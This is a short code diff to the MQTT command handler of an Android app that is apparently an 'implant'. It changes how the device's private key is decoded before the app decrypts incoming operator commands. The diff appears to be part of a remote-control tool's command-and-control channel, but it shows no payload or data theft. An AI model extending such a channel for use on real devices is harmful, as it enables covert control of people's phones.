@@ -3,6 +3,8 @@ package com.cooperthecoder.implant.command
 import android.content.Context
 import android.util.Log
 import com.cooperthecoder.implant.Config
+import com.cooperthecoder.implant.crypto.Base64Encoder
+import com.cooperthecoder.implant.crypto.Base64KeyPair
 import com.cooperthecoder.implant.crypto.NetworkEncryption
 import com.cooperthecoder.implant.data.SharedPreferencesQuery
 import org.eclipse.paho.android.service.MqttAndroidClient
@@ -23,9 +25,10 @@ class CommandMessageCallback(client: MqttAndroidClient, context: Context) : Mqtt
     override fun messageArrived(topic: String, message: MqttMessage) {
         val text = String(message.payload, Charset.forName("UTF-8"))
         Log.d(TAG, "Received message: $text")
+        val privateKey = Base64KeyPair(SharedPreferencesQuery.getPrivateKey(context)).privateKeyBase64()
         val networkEncryption = NetworkEncryption(
                 Config.OPERATOR_PUBLIC_KEY,
-                SharedPreferencesQuery.getPrivateKey(context)
+                privateKey
         )
         val command: Command = try {
             Command.fromJson(networkEncryption, text)
